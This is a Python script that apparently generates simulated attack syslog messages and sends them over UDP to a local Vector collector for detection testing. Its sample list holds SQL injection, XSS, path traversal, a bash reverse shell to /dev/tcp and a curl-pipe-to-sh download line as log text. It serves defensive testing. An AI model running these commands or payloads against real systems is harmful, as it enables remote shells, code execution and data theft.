#!/usr/bin/env python3
import argparse
import random
import socket
import time
from datetime import datetime, timezone


SAMPLES = [
    (
        "ssh_bruteforce",
        "sshd",
        "Failed password for invalid user admin from 203.0.113.10 port 48122 ssh2",
    ),
    (
        "ssh_bruteforce",
        "sshd",
        "Invalid user oracle from 203.0.113.11 port 48123",
    ),
    (
        "sql_injection",
        "nginx",
        '198.51.100.21 - - "GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1" 403 532',
    ),
    (
        "sql_injection",
        "nginx",
        '198.51.100.22 - - "GET /login?user=admin or 1=1 HTTP/1.1" 403 412',
    ),
    (
        "xss",
        "nginx",
        '198.51.100.31 - - "GET /search?q=<script>alert(1)</script> HTTP/1.1" 403 355',
    ),
    (
        "xss",
        "nginx",
        '198.51.100.32 - - "GET /profile?next=javascript:alert(document.cookie) HTTP/1.1" 403 388',
    ),
    (
        "path_traversal",
        "nginx",
        '203.0.113.44 - - "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 298',
    ),
    (
        "path_traversal",
        "nginx",
        '203.0.113.45 - - "GET /cgi-bin/view?path=/proc/self/environ HTTP/1.1" 403 301',
    ),
    (
        "command_execution",
        "app",
        'command probe payload="bash -i >& /dev/tcp/198.51.100.88/4444 0>&1"',
    ),
    (
        "command_execution",
        "app",
        'command probe payload="curl http://198.51.100.89/p.sh | sh"',
    ),
]


def build_syslog(hostname: str, appname: str, message: str, seq: int) -> str:
    timestamp = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")
    procid = 4000 + seq
    msgid = f"attack-sim-{seq}"
    return f"<134>1 {timestamp} {hostname} {appname} {procid} {msgid} - {message}"


def main() -> None:
    parser = argparse.ArgumentParser(description="Send simulated attack syslog events to Vector UDP syslog.")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=10514)
    parser.add_argument("--count", type=int, default=len(SAMPLES))
    parser.add_argument("--rate", type=float, default=1.0, help="messages per second")
    parser.add_argument("--hostname", default="attack-simulator.local")
    parser.add_argument("--shuffle", action="store_true")
    args = parser.parse_args()

    samples = SAMPLES.copy()
    if args.shuffle:
        random.shuffle(samples)

    interval = 1.0 / args.rate if args.rate > 0 else 0.0
    address = (args.host, args.port)

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        for seq in range(1, args.count + 1):
            attack_type, appname, message = samples[(seq - 1) % len(samples)]
            payload = build_syslog(args.hostname, appname, message, seq)
            sock.sendto(payload.encode("utf-8"), address)
            print(f"sent seq={seq} type={attack_type} app={appname} target={args.host}:{args.port}")
            if interval > 0 and seq < args.count:
                time.sleep(interval)


if __name__ == "__main__":
    main()
